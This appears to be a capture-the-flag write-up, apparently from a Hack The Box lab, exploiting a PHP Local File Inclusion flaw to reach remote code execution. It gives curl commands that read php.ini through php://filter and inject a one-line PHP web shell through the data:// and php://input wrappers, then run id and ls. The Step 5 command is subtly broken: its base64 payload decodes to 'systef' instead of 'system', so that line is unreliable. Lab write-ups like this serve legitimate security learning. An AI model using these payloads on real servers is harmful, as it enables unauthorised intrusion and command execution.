# PHP LFI to RCE Exploit Write-Up

This repository documents a step-by-step process to exploit a Local File Inclusion (LFI) vulnerability in a PHP web application to read sensitive files and achieve Remote Code Execution (RCE).

## Overview
The target is a web server running a PHP application at `http://94.237.58.172:47698`. The application has an LFI vulnerability in the `language` parameter, which allows reading arbitrary files and, with `allow_url_include` enabled, executing remote code.

## Steps

### Step 1: Discover LFI Vulnerability
Using `curl`, I accessed the `php.ini` file by exploiting the LFI vulnerability with a PHP filter to base64-encode the file content:
```bash
curl "http://94.237.58.172:47698/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
The response contained the base64-encoded php.ini file embedded in the HTML.
### Step 2: Save and Decode the File
I saved the HTML response (including the base64-encoded `php.ini`) to a file named `text.text`:
```bash
nano text.text
```
Then, I decoded the base64 content to extract the php.ini file:
```bash
base64 -d text.text > config.php
```
### Step 3: Check for `allow_url_include`

I inspected the decoded `php.ini` to confirm if `allow_url_include` was enabled:
`grep allow_url_include config.php`

![image](https://github.com/user-attachments/assets/53bb4fc4-39ed-43a5-8995-9b65955f9691)

`allow_url_include = On`. This setting allows including remote files, enabling potential RCE.

### Step 4: Achieve Remote Code Execution

I crafted a PHP payload to execute system commands via the `cmd` parameter:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```
`PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==`.
Using the `data:// wrapper`, I included the base64-encoded payload and executed the `id` command:
```bash
curl -s 'http://94.237.58.172:47698/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
![image](https://github.com/user-attachments/assets/f1dffee5-c6b0-4e02-9f32-31758e7a0c00)

I also tried an alternative method using POST with `php://input`:
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.58.172:47698/index.php?language=php://input&cmd=id" | grep uid
```
![image](https://github.com/user-attachments/assets/1827af98-4e22-4b83-850f-794ccbf15d21)

Same output, confirming RCE.

### Step 5: Explore the File System

I listed the root directory to find interesting files:

```bash
curl -s 'http://94.237.58.172:47698/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVmKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20/'
```
_Explore more to get the flag._

## Notes
This exploit relies on `allow_url_include = On` and an LFI vulnerability.

The `data://` and `php://input` wrappers were used to bypass restrictions and execute code.

Always test exploits in controlled environments (e.g., CTFs like Hack The Box).

## Files
`text.text`: Raw HTML response containing base64-encoded `php.ini`.

`config.php`: Decoded `php.ini` file.


